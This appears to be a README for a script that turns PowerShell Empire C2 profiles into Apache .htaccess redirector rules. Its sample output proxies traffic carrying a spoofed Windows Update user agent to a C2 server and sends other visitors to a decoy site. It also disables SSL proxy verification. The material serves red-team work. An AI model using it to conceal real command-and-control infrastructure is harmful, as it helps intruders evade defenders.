# Convert Empire profiles to Apache mod_rewrite .htaccess files to support HTTP C2 Redirection

This is a quick script that converts a empire profile to a functional mod_rewrite .htaccess file to support HTTP proxy redirection from Apache to a empire server.

You should test and tune the output as needed before depolying

__Updates and Features__

 - Rewrite Rules based on valid C2 URIs (HTTP GET, POST, and Stager) and specified User-Agent string. Result: Only requests to valid C2 URIs with a specified UA string will be proxied to the Team Server by default.
 - Uses a custom Malleable C2 profile to build a .htaccess file with corresponding mod_rewrite rules
 - HTTP or HTTPS proxying to the Empire Server
 - HTTP 302 Redirection to a Legitimate Site for Non-Matching Requests	

## Example
```
$ python e2modrewrite.py -i profiles/normal/microsoftupdate.profile -c 192.168.1.11 -d https://google.com

#### Save the following as .htaccess in the root web directory
########################################
## .htaccess START

RewriteEngine On

## (Optional)
## Empire Stager
## Uncomment and adjust as needed
#RewriteCond %{REQUEST_URI} ^/css/style1.css?$
#RewriteCond %{HTTP_USER_AGENT} ^$
#RewriteRule ^.*$ "http://192.168.1.11/download/po" [P,L]

## Profile URIs
RewriteCond %{REQUEST_URI} ^/(c/msdownload/update/others/2013/11/9946821_f5082b842c8abc5c47cfc68f98340ec384b69fa9.cab|c/msdownload/update/software/ftpk/2013/11/ie-spelling-nl_3576e6450352dfc0c0892bf62384e75a56d780a7.msu)/?$

## Profile UserAgent
RewriteCond %{HTTP_USER_AGENT} ^Windows-Update-Agent/10\.0\.10011\.16384\ Client-Protocol/1\.40?$
RewriteRule ^.*$ http://192.168.1.11%{REQUEST_URI} [P]

# Redirect all other traffic here
RewriteRule ^.*$ https://google.com/? [L,R=302]

## .htacess END
########################################
```

----------------------------------------------
## Apache Rewrite Setup and Tips

__Enable Rewrite and Proxy__

    a2enmod rewrite
    a2enmod proxy
    a2enmod proxy_http
    service apache2 reload

__SSL support requires the following in the site config__

    # Enable SSL
    SSLEngine On
    # Enable Proxy
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off

## References

[Apache mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html)
